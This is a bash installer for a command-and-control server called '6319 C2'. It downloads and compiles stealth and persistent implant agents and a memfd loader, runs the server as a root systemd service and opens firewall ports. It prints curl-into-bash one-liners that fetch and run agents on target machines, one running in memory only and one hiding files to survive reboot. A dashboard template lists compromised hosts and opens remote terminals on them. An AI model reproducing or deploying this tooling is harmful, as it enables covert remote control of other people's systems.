#!/bin/bash
set -e

BG="\033[48;5;236m"
FROST="\033[38;5;110m"
AURORA="\033[38;5;108m"
SNOW="\033[38;5;255m"
PURPLE="\033[38;5;139m"
YELLOW="\033[38;5;222m"
RED="\033[38;5;174m"
N="\033[0m"

INSTALL_DIR="/opt/6319"
SERVICE_NAME="6319-c2"

echo ""
echo -e "${FROST}"
cat << 'BANNER'
     ████████╗ ██████╗  ███╗  █████╗ 
     ██╔═════╝ ╚════██╗ ███║ ██╔══██╗
     ████████╗  █████╔╝ ███║ ╚██████║
     ██╔═════╝  ╚═══██╗ ███║  ╚═══██║
     ████████╗ ██████╔╝ ███║  █████╔╝
     ╚═══════╝ ╚═════╝  ╚══╝  ╚════╝ 
BANNER
echo -e "${PURPLE}        C2 Server v3.2 Installer${N}"
echo ""

info() { echo -e "${AURORA}[+]${N} $1"; }
step() { echo -e "${FROST}[>]${N} $1"; }
done_step() { echo -e "${AURORA}[✓]${N} $1"; }
warn() { echo -e "${YELLOW}[!]${N} $1"; }
err() { echo -e "${RED}[-]${N} $1"; exit 1; }

section() {
    echo ""
    echo -e "${FROST}━━━ $1 ━━━${N}"
}

START_TIME=$(date +%s)

[[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"

generate_path() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 26 | head -n 1
}

generate_key() {
    local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789;^.$[]{}?+-_'
    local key=""
    for i in {1..40}; do
        key+="${chars:RANDOM%${#chars}:1}"
    done
    echo "$key"
}

section "GENERATING CONFIGURATION"

step "Generating random ports..."
C2_WEB_PORT=$((5000 + RANDOM % 4000))
C2_SOCKET_PORT=$((C2_WEB_PORT + 1))
done_step "Web: ${FROST}${C2_WEB_PORT}${N} | Socket: ${FROST}${C2_SOCKET_PORT}${N}"

step "Generating secure paths..."
STEALTH_PATH=$(generate_path)
PERSIST_PATH=$(generate_path)
LOGIN_PATH=$(generate_path)
DASHBOARD_PATH=$(generate_path)
done_step "Login path: ${FROST}${LOGIN_PATH:0:8}...${N}"
done_step "Dashboard path: ${FROST}${DASHBOARD_PATH:0:8}...${N}"

step "Generating access key..."
AUTH_KEY=$(generate_key)
SESSION_SECRET=$(openssl rand -hex 32 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 64 | head -n 1)
done_step "Auth key: ${YELLOW}${AUTH_KEY:0:12}...${N} (40 chars)"

detect_os() {
    step "Detecting operating system..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        OS_VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
        OS_VERSION="unknown"
    elif [ -f /etc/debian_version ]; then
        OS="debian"
        OS_VERSION=$(cat /etc/debian_version)
    else
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
        OS_VERSION="unknown"
    fi
    done_step "OS: ${FROST}${OS}${N} ${OS_VERSION}"
}

install_deps_debian() {
    step "Updating package lists..."
    apt-get update -qq
    step "Installing: python3, pip, venv, curl, git, wget..."
    apt-get install -y -qq python3 python3-pip python3-venv curl git wget >/dev/null 2>&1
    done_step "APT packages installed"
}

install_deps_rhel() {
    if command -v dnf &>/dev/null; then
        step "Installing via DNF: python3, pip, curl, git, wget..."
        dnf install -y python3 python3-pip curl git wget >/dev/null 2>&1
    else
        step "Installing via YUM: python3, pip, curl, git, wget..."
        yum install -y python3 python3-pip curl git wget >/dev/null 2>&1
    fi
    done_step "RPM packages installed"
}

install_deps_arch() {
    step "Installing via Pacman: python, pip, curl, git, wget..."
    pacman -Sy --noconfirm python python-pip curl git wget >/dev/null 2>&1
    done_step "Pacman packages installed"
}

install_deps_alpine() {
    step "Installing via APK: python3, pip, curl, git, wget..."
    apk add --no-cache python3 py3-pip curl git wget >/dev/null 2>&1
    done_step "Alpine packages installed"
}

install_go() {
    if command -v go &>/dev/null; then
        GO_VER=$(go version | awk '{print $3}')
        done_step "Go already installed: ${FROST}${GO_VER}${N}"
        return 0
    fi
    
    GO_VERSION="1.21.5"
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64) GO_ARCH="amd64" ;;
        aarch64|arm64) GO_ARCH="arm64" ;;
        armv7l|armv6l) GO_ARCH="armv6l" ;;
        *) err "Unsupported architecture: $ARCH" ;;
    esac
    
    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    GO_URL="https://go.dev/dl/${GO_TAR}"
    
    step "Downloading Go ${GO_VERSION} for ${GO_ARCH}..."
    cd /tmp
    wget -q "$GO_URL" -O "$GO_TAR" || curl -fsSL "$GO_URL" -o "$GO_TAR"
    
    step "Extracting to /usr/local/go..."
    rm -rf /usr/local/go
    tar -C /usr/local -xzf "$GO_TAR"
    rm -f "$GO_TAR"
    
    export PATH="/usr/local/go/bin:$PATH"
    
    if ! grep -q '/usr/local/go/bin' /etc/profile; then
        echo 'export PATH="/usr/local/go/bin:$PATH"' >> /etc/profile
    fi
    
    done_step "Go installed: ${FROST}$(go version | awk '{print $3}')${N}"
}

install_deps() {
    case "$OS" in
        ubuntu|debian|kali|mint|pop) install_deps_debian ;;
        rhel|centos|fedora|rocky|alma) install_deps_rhel ;;
        arch|manjaro|endeavouros) install_deps_arch ;;
        alpine) install_deps_alpine ;;
        *) 
            warn "Unknown OS: $OS, trying apt..."
            install_deps_debian || install_deps_rhel || err "Failed to install deps"
            ;;
    esac
}

setup_firewall() {
    step "Configuring firewall rules..."
    if command -v ufw &>/dev/null; then
        ufw allow ${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
        ufw allow ${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
        done_step "UFW: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
    elif command -v firewall-cmd &>/dev/null; then
        firewall-cmd --permanent --add-port=${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
        firewall-cmd --permanent --add-port=${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
        done_step "Firewalld: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
    elif command -v iptables &>/dev/null; then
        iptables -I INPUT -p tcp --dport ${C2_WEB_PORT} -j ACCEPT 2>/dev/null || true
        iptables -I INPUT -p tcp --dport ${C2_SOCKET_PORT} -j ACCEPT 2>/dev/null || true
        done_step "iptables: opened ports ${FROST}${C2_WEB_PORT}${N}, ${FROST}${C2_SOCKET_PORT}${N}"
    else
        warn "No firewall detected, skipping"
    fi
}

section "SYSTEM DEPENDENCIES"
detect_os
install_deps

section "GO TOOLCHAIN"
install_go

if systemctl is-active --quiet ${SERVICE_NAME} 2>/dev/null; then
    step "Stopping existing service..."
    systemctl stop ${SERVICE_NAME}
    done_step "Service stopped"
fi

section "PYTHON ENVIRONMENT"

step "Creating directory: ${FROST}/opt/6319${N}"
rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/templates" "$INSTALL_DIR/static"
cd "$INSTALL_DIR"

step "Creating Python virtual environment..."
python3 -m venv venv
source venv/bin/activate
done_step "Virtual environment created"

step "Installing pip packages: flask, socketio, nacl, gevent..."
pip install --upgrade pip -q
pip install flask flask-socketio pynacl gevent gevent-websocket requests -q
done_step "Python packages installed"

section "EMBEDDED MODULES"

step "Writing crypto.py (NaCl encryption)..."
cat > crypto.py << 'CRYPTO_EOF'
import os
import secrets
import hashlib
import nacl.secret
import nacl.utils

def generate_secret():
    return secrets.token_hex(32)

def verify_secret(secret):
    return secret and len(secret) >= 32

class SecureChannel:
    def __init__(self, secret):
        key = hashlib.sha256(secret.encode()).digest()
        self.box = nacl.secret.SecretBox(key)
    
    def enc(self, data):
        import json
        plaintext = json.dumps(data).encode()
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        ciphertext = self.box.encrypt(plaintext, nonce)
        return ciphertext
    
    def dec(self, data):
        import json
        plaintext = self.box.decrypt(data)
        return json.loads(plaintext.decode())
CRYPTO_EOF

cat > webhooks.py << 'WEBHOOKS_EOF'
import os
import requests
import threading

class WebhookNotifier:
    def __init__(self):
        self.telegram_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.telegram_chat = os.environ.get('TELEGRAM_CHAT_ID')
        self.discord_url = os.environ.get('DISCORD_WEBHOOK_URL')
    
    def is_configured(self):
        return bool(self.telegram_token and self.telegram_chat) or bool(self.discord_url)
    
    def notify(self, message, event_type='info'):
        if self.telegram_token and self.telegram_chat:
            threading.Thread(target=self._send_telegram, args=(message,), daemon=True).start()
        if self.discord_url:
            threading.Thread(target=self._send_discord, args=(message, event_type), daemon=True).start()
    
    def _send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            requests.post(url, json={'chat_id': self.telegram_chat, 'text': message, 'parse_mode': 'HTML'}, timeout=10)
        except:
            pass
    
    def _send_discord(self, message, event_type):
        try:
            color = {'connect': 0x00ff00, 'disconnect': 0xff0000, 'beacon': 0x0099ff}.get(event_type, 0x808080)
            requests.post(self.discord_url, json={'embeds': [{'description': message, 'color': color}]}, timeout=10)
        except:
            pass
WEBHOOKS_EOF
done_step "Embedded modules written"

section "DOWNLOADING FROM GITHUB"

GITHUB_RAW="https://raw.githubusercontent.com/44pie/6319/main"

step "Downloading server.py..."
curl -fsSL "${GITHUB_RAW}/server.py" -o server.py || err "Failed to download server.py"
done_step "server.py downloaded"

step "Downloading agent_stealth.py..."
curl -fsSL "${GITHUB_RAW}/agent_stealth.py" -o agent_stealth.py || warn "Could not download agent_stealth.py"

step "Downloading memfd_loader.py..."
curl -fsSL "${GITHUB_RAW}/memfd_loader.py" -o memfd_loader.py || warn "Could not download memfd_loader.py"

curl -fsSL "${GITHUB_RAW}/crypto.py" -o crypto.py 2>/dev/null || true
curl -fsSL "${GITHUB_RAW}/webhooks.py" -o webhooks.py 2>/dev/null || true
done_step "Python sources downloaded"

section "GO AGENT BUILD"

step "Downloading Go source files..."
mkdir -p go/cmd/agent go/cmd/loader
curl -fsSL "${GITHUB_RAW}/go/go.mod" -o go/go.mod || err "Failed to download go.mod"
curl -fsSL "${GITHUB_RAW}/go/go.sum" -o go/go.sum 2>/dev/null || true
curl -fsSL "${GITHUB_RAW}/go/cmd/agent/main.go" -o go/cmd/agent/main.go || err "Failed to download agent source"
curl -fsSL "${GITHUB_RAW}/go/cmd/loader/main.go" -o go/cmd/loader/main.go || err "Failed to download loader source"
done_step "Go sources downloaded"

mkdir -p bin
cd go

export PATH="/usr/local/go/bin:$PATH"
export CGO_ENABLED=0

ARCH=$(uname -m)
case "$ARCH" in
    x86_64) GOARCH="amd64" ;;
    aarch64|arm64) GOARCH="arm64" ;;
    *) GOARCH="amd64" ;;
esac

step "Fetching Go dependencies..."
go mod download 2>/dev/null || go mod tidy
done_step "Dependencies fetched"

step "Compiling agent (linux/${GOARCH})..."
GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/agent_linux_${GOARCH} ./cmd/agent/
AGENT_SIZE=$(ls -lh ../bin/agent_linux_${GOARCH} 2>/dev/null | awk '{print $5}')
done_step "Agent built: ${FROST}${AGENT_SIZE}${N}"

step "Compiling loader (linux/${GOARCH})..."
GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/loader_linux_${GOARCH} ./cmd/loader/
LOADER_SIZE=$(ls -lh ../bin/loader_linux_${GOARCH} 2>/dev/null | awk '{print $5}')
done_step "Loader built: ${FROST}${LOADER_SIZE}${N}"

cd ..

if [ -f "bin/agent_linux_${GOARCH}" ]; then
    done_step "Go binaries ready in ${FROST}/opt/6319/bin/${N}"
else
    err "Failed to build Go binaries"
fi

section "WEB INTERFACE"

mkdir -p templates static

step "Downloading templates..."
curl -fsSL "${GITHUB_RAW}/templates/index.html" -o templates/index.html || err "Failed to download index.html"
curl -fsSL "${GITHUB_RAW}/templates/login.html" -o templates/login.html || err "Failed to download login.html"
done_step "Templates downloaded (index.html, login.html)"

step "Downloading static assets..."
curl -fsSL "${GITHUB_RAW}/static/style.css" -o static/style.css || err "Failed to download style.css"
done_step "Static assets downloaded (style.css)"

: << 'EMBEDDED_TEMPLATES_DISABLED'
cat > templates/index.html << 'INDEX_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>6319 C2</title>
<link rel="stylesheet" href="/static/style.css">
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
</head>
<body>
<div class="container">
<header>
<pre class="ascii-art">
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
</pre>
<div class="stats-panel">
<div class="stat online"><span class="value" id="stat-online">0</span><span class="label">ONLINE</span></div>
<div class="stat dead"><span class="value" id="stat-dead">0</span><span class="label">DEAD</span></div>
<div class="stat total"><span class="value" id="stat-total">0</span><span class="label">TOTAL</span></div>
</div>
</header>
<div class="info-bar">
<div class="info-item"><span class="info-label">Stealth:</span><code class="info-value" id="deploy-stealth"></code></div>
<div class="info-item"><span class="info-label">Persist:</span><code class="info-value" id="deploy-persist"></code></div>
</div>
<div class="main-grid">
<div class="clients-panel">
<div class="panel-header">HOSTS</div>
<div class="clients-list" id="clients"></div>
</div>
<div class="terminal-panel">
<div class="panel-header">
<span id="term-title">Terminal</span>
<div id="term-controls" style="display:none;margin-left:auto;">
<select id="channel-select" class="channel-select"></select>
<button class="ctrl-btn" onclick="openPty()">PTY</button>
<button class="ctrl-btn red" onclick="closePty()">Close</button>
</div>
</div>
<div id="terminal-container"></div>
</div>
</div>
</div>
<script>
let socket=io(),term,ptySessionId=null,ptyMode=false,selected=null,selectedHost=null,selectedChannel=null,selectedClient=null,hostsData=[];
const fitAddon=new (class{fit(){if(term){const d=document.getElementById('terminal-container');if(d){const cols=Math.floor(d.clientWidth/9);const rows=Math.floor(d.clientHeight/17);term.resize(cols,rows);if(ptyMode&&ptySessionId)socket.emit('pty_resize',{session_id:ptySessionId,cols,rows});}}}})();
socket.on('connect',()=>console.log('WebSocket connected'));
socket.on('pty_ready',d=>{if(term)term.focus();});
socket.on('pty_output',d=>{if(term&&d.session_id===ptySessionId)term.write(d.data);});
socket.on('pty_closed',d=>{if(d.session_id===ptySessionId){closePty();term.write('\r\n\x1b[1;31m[PTY Closed]\x1b[0m\r\n');}});
socket.on('error',d=>alert(d.message));
async function refresh(){
const[hosts,stats]=await Promise.all([fetch('/api/clients').then(r=>r.json()),fetch('/api/stats').then(r=>r.json())]);
hostsData=hosts;
document.getElementById('stat-online').textContent=stats.online;
document.getElementById('stat-dead').textContent=stats.dead||0;
document.getElementById('stat-total').textContent=stats.total;
document.getElementById('deploy-stealth').textContent=stats.deploy_stealth;
document.getElementById('deploy-persist').textContent=stats.deploy_persist;
const list=document.getElementById('clients');
list.innerHTML='';
hosts.forEach(h=>{
const el=document.createElement('div');
const statusClass=h.overall_online?'online':(h.overall_status==='beacon'?'beacon':(h.overall_status==='sleeping'?'sleeping':'dark'));
el.className=`client ${statusClass} ${selectedHost===h.host_key?'selected':''}`;
el.onclick=(e)=>selectHost(h,e);
const channelBadges=h.channel_list.map(ch=>{
const chData=h.channels[ch];
let chStatus='offline';
if(chData.online)chStatus='online';
else if(chData.status==='beacon')chStatus='beacon';
return `<span class="channel-pill ${ch} ${chStatus}">${ch.toUpperCase()}</span>`;
}).join('');
el.innerHTML=`
<div class="client-row">
<span class="status-dot ${statusClass}"></span>
<span class="hostname">${h.hostname}</span>
<div class="channel-pills">${channelBadges}</div>
</div>
<div class="client-details">
<div><span class="lbl">IP:</span> ${h.ip}</div>
<div><span class="lbl">OS:</span> ${h.os}</div>
<div><span class="lbl">User:</span> ${h.user}</div>
<div><span class="lbl">Last seen:</span> ${h.last_seen_ago}</div>
</div>`;
list.appendChild(el);
});
}
function selectHost(h,e){
if(ptyMode)closePty();
selectedHost=h.host_key;
const channelSelect=document.getElementById('channel-select');
channelSelect.innerHTML='';
h.channel_list.forEach(ch=>{
const opt=document.createElement('option');
opt.value=ch;
const chData=h.channels[ch];
opt.textContent=`${ch.toUpperCase()} (${chData.online?'ONLINE':chData.status.toUpperCase()})`;
channelSelect.appendChild(opt);
});
const defaultChannel=h.channel_list.find(ch=>h.channels[ch].online)||h.channel_list[0];
channelSelect.value=defaultChannel;
selectedChannel=defaultChannel;
const chData=h.channels[selectedChannel];
selected=chData.id;
selectedClient=chData;
document.getElementById('term-title').textContent=`${h.hostname}`;
document.getElementById('term-controls').style.display='flex';
document.querySelectorAll('.client').forEach(el=>el.classList.remove('selected'));
if(e&&e.currentTarget)e.currentTarget.classList.add('selected');
}
document.getElementById('channel-select').addEventListener('change',function(){
selectedChannel=this.value;
const host=hostsData.find(h=>h.host_key===selectedHost);
if(host&&host.channels[selectedChannel]){
selected=host.channels[selectedChannel].id;
selectedClient=host.channels[selectedChannel];
}
if(ptyMode)closePty();
});
function openPty(){
if(!selected||!selectedClient)return alert('Select a host first');
if(!selectedClient.online)return alert('Host is offline');
if(ptyMode)closePty();
ptySessionId=Math.random().toString(36).substr(2,9);
ptyMode=true;
const container=document.getElementById('terminal-container');
container.innerHTML='';
term=new Terminal({cursorBlink:true,fontSize:14,fontFamily:"'JetBrains Mono',monospace",theme:{background:'#2e3440',foreground:'#eceff4',cursor:'#88c0d0',selection:'rgba(136,192,208,0.3)'}});
term.open(container);
term.onData(data=>socket.emit('pty_input',{session_id:ptySessionId,data}));
fitAddon.fit();
socket.emit('pty_spawn',{client_id:selected,session_id:ptySessionId,cols:term.cols,rows:term.rows});
}
function closePty(){
if(ptySessionId)socket.emit('pty_close',{session_id:ptySessionId});
ptySessionId=null;
ptyMode=false;
}
window.addEventListener('resize',()=>fitAddon.fit());
refresh();
setInterval(refresh,5000);
</script>
</body>
</html>
INDEX_EOF

cat > templates/login.html << 'LOGIN_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>6319 - Login</title>
<link rel="stylesheet" href="/static/style.css">
<style>
.login-container{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg0);}
.login-logo{font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.1;color:var(--accent);margin-bottom:32px;text-align:center;white-space:pre;}
.login-card{background:var(--bg1);border-radius:8px;padding:32px;width:100%;max-width:400px;border:1px solid var(--bg2);}
.login-title{color:var(--fg);font-size:14px;text-align:center;margin-bottom:24px;letter-spacing:2px;}
.login-input{width:100%;padding:12px 16px;background:var(--bg0);border:1px solid var(--bg3);border-radius:4px;color:var(--fg);font-family:'JetBrains Mono',monospace;font-size:14px;margin-bottom:16px;box-sizing:border-box;}
.login-input:focus{outline:none;border-color:var(--accent);}
.login-input::placeholder{color:var(--fg3);}
.login-btn{width:100%;padding:12px;background:var(--accent);border:none;border-radius:4px;color:var(--bg0);font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:bold;letter-spacing:1px;cursor:pointer;transition:background 0.2s;}
.login-btn:hover{background:var(--accent2);}
.login-error{background:rgba(191,97,106,0.2);border:1px solid var(--red);color:var(--red);padding:10px 14px;border-radius:4px;font-size:12px;margin-bottom:16px;text-align:center;}
</style>
</head>
<body>
<div class="login-container">
<pre class="login-logo">
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
</pre>
<div class="login-card">
<div class="login-title">ACCESS KEY REQUIRED</div>
{% if error %}<div class="login-error">{{ error }}</div>{% endif %}
<form method="POST" action="/login">
<input type="password" name="key" class="login-input" placeholder="Enter access key" autofocus required>
<button type="submit" class="login-btn">AUTHENTICATE</button>
</form>
</div>
</div>
</body>
</html>
LOGIN_EOF

cat > static/style.css << 'STYLE_EOF'
:root{--bg0:#2e3440;--bg1:#3b4252;--bg2:#434c5e;--bg3:#4c566a;--fg:#eceff4;--fg2:#d8dee9;--fg3:#a5b1c2;--accent:#88c0d0;--accent2:#81a1c1;--green:#a3be8c;--red:#bf616a;--yellow:#ebcb8b;--purple:#b48ead;--orange:#d08770;}
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'JetBrains Mono','Fira Code',monospace;background:var(--bg0);color:var(--fg);min-height:100vh;}
.container{max-width:1600px;margin:0 auto;padding:16px;}
header{display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:1px solid var(--bg2);margin-bottom:16px;}
.ascii-art{font-size:9px;line-height:1.1;color:var(--accent);margin:0;}
.stats-panel{display:flex;gap:20px;}
.stat{text-align:center;}
.stat .value{display:block;font-size:24px;font-weight:bold;}
.stat.online .value{color:var(--green);}
.stat.dead .value{color:var(--red);}
.stat.total .value{color:var(--fg3);}
.stat .label{font-size:9px;color:var(--fg3);letter-spacing:1px;}
.info-bar{display:flex;gap:24px;padding:8px 16px;background:var(--bg1);border-radius:6px;margin-bottom:12px;align-items:center;flex-wrap:wrap;}
.info-item{font-size:11px;}
.info-label{color:var(--fg3);margin-right:6px;}
.info-value{color:var(--green);}
.channel-pills{position:absolute;top:10px;right:12px;display:flex;flex-direction:column;gap:3px;align-items:flex-end;}
.channel-pill{font-size:8px;padding:2px 6px;border-radius:3px;letter-spacing:0.5px;font-weight:bold;}
.channel-pill.stealth{background:transparent;border:1px solid var(--purple);color:var(--purple);}
.channel-pill.stealth.online{background:var(--purple);color:var(--bg0);}
.channel-pill.persist{background:transparent;border:1px solid var(--orange);color:var(--orange);}
.channel-pill.persist.online{background:var(--orange);color:var(--bg0);}
.channel-pill.offline{opacity:0.5;}
.channel-select{background:var(--bg2);border:1px solid var(--bg3);color:var(--fg);font-family:inherit;font-size:11px;padding:4px 8px;border-radius:4px;cursor:pointer;margin-right:8px;}
.channel-select:focus{outline:none;border-color:var(--accent);}
.main-grid{display:grid;grid-template-columns:300px 1fr;gap:16px;height:calc(100vh - 180px);}
.clients-panel,.terminal-panel{background:var(--bg1);border-radius:8px;overflow:hidden;display:flex;flex-direction:column;}
.panel-header{padding:10px 16px;background:var(--bg2);font-size:11px;letter-spacing:1px;color:var(--fg3);display:flex;align-items:center;}
.clients-list{flex:1;overflow-y:auto;padding:8px;}
.client{background:var(--bg2);border-radius:5px;padding:10px 12px;margin-bottom:8px;cursor:pointer;border:2px solid transparent;transition:all 0.15s;position:relative;}
.client:hover{border-color:var(--bg3);}
.client.selected{border-color:var(--accent);background:var(--bg3);}
.client.online{border-left:3px solid var(--green);}
.client.beacon{border-left:3px solid var(--accent);}
.client.sleeping{border-left:3px solid var(--yellow);opacity:0.7;}
.client.dark{border-left:3px solid var(--bg3);opacity:0.5;}
.client-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.hostname{flex:1;font-weight:bold;color:var(--fg);}
.status-dot{width:10px;height:10px;min-width:10px;min-height:10px;border-radius:50%;flex-shrink:0;display:inline-block;}
.status-dot.online{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s infinite;}
.status-dot.beacon{background:var(--accent);}
.status-dot.sleeping{background:var(--yellow);}
.status-dot.dark{background:var(--bg3);}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.5;}}
.client-details{font-size:11px;color:var(--fg2);line-height:1.5;}
.client-details .lbl{color:var(--fg3);}
.terminal-panel{display:flex;flex-direction:column;}
#terminal-container{flex:1;padding:8px;background:var(--bg0);}
.ctrl-btn{background:var(--bg2);border:1px solid var(--bg3);color:var(--fg);padding:4px 10px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:4px;}
.ctrl-btn:hover{background:var(--bg3);}
.ctrl-btn.red{border-color:var(--red);color:var(--red);}
.ctrl-btn.red:hover{background:var(--red);color:var(--bg0);}
STYLE_EOF
EMBEDDED_TEMPLATES_DISABLED

section "CONFIGURATION"

step "Writing environment file..."
cat > .env << EOF
C2_WEB_PORT=${C2_WEB_PORT}
C2_SOCKET_PORT=${C2_SOCKET_PORT}
STEALTH_PATH=${STEALTH_PATH}
PERSIST_PATH=${PERSIST_PATH}
LOGIN_PATH=${LOGIN_PATH}
DASHBOARD_PATH=${DASHBOARD_PATH}
AUTH_KEY=${AUTH_KEY}
SESSION_SECRET=${SESSION_SECRET}
EOF
chmod 600 .env
done_step "Environment saved to ${FROST}.env${N}"

setup_firewall

section "SYSTEMD SERVICE"

step "Creating service file..."
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=6319 C2 Server v3.2
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
EnvironmentFile=${INSTALL_DIR}/.env
Environment="PATH=${INSTALL_DIR}/venv/bin:/usr/local/bin:/usr/bin:/bin"
ExecStart=${INSTALL_DIR}/venv/bin/python ${INSTALL_DIR}/server.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
done_step "Service file created"

step "Reloading systemd daemon..."
systemctl daemon-reload
done_step "Daemon reloaded"

step "Enabling service..."
systemctl enable ${SERVICE_NAME} >/dev/null 2>&1
done_step "Service enabled (autostart on boot)"

step "Starting service..."
systemctl start ${SERVICE_NAME}
sleep 2

SERVER_IP=$(hostname -I | awk '{print $1}')
END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))

if systemctl is-active --quiet ${SERVICE_NAME}; then
    done_step "Service started successfully"
    
    echo ""
    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
    echo -e "${AURORA}        6319 C2 Server v3.2 INSTALLED${N}"
    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
    echo ""
    echo -e "${PURPLE}ACCESS CREDENTIALS${N} ${SNOW}(save these!)${N}"
    echo -e "  ${FROST}┌─${N} Login URL"
    echo -e "  ${FROST}│${N}  ${SNOW}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
    echo -e "  ${FROST}├─${N} Dashboard URL"
    echo -e "  ${FROST}│${N}  ${SNOW}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
    echo -e "  ${FROST}├─${N} Access Key"
    echo -e "  ${FROST}│${N}  ${YELLOW}${AUTH_KEY}${N}"
    echo -e "  ${FROST}└─${N} Session lifetime: ${FROST}24 hours${N}"
    echo ""
    echo -e "${PURPLE}DEPLOY COMMANDS${N}"
    echo ""
    echo -e "  ${SNOW}Stealth${N} ${FROST}(in-memory, no disk writes)${N}"
    echo -e "  ${AURORA}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\"${N}"
    echo ""
    echo -e "  ${SNOW}Persist${N} ${FROST}(hidden files, survives reboot)${N}"
    echo -e "  ${AURORA}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\"${N}"
    echo ""
    echo -e "${PURPLE}SERVICE MANAGEMENT${N}"
    echo -e "  ${FROST}Web Port:${N}     ${SNOW}${C2_WEB_PORT}${N}"
    echo -e "  ${FROST}Agent Port:${N}   ${SNOW}${C2_SOCKET_PORT}${N} (encrypted)"
    echo -e "  ${FROST}Status:${N}       systemctl status ${SERVICE_NAME}"
    echo -e "  ${FROST}Logs:${N}         journalctl -u ${SERVICE_NAME} -f"
    echo -e "  ${FROST}Config:${N}       /opt/6319/.env"
    echo ""
    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
    echo -e "${AURORA}Completed in ${SNOW}${ELAPSED}${AURORA} seconds${N}"
    echo ""
else
    err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 50"
fi
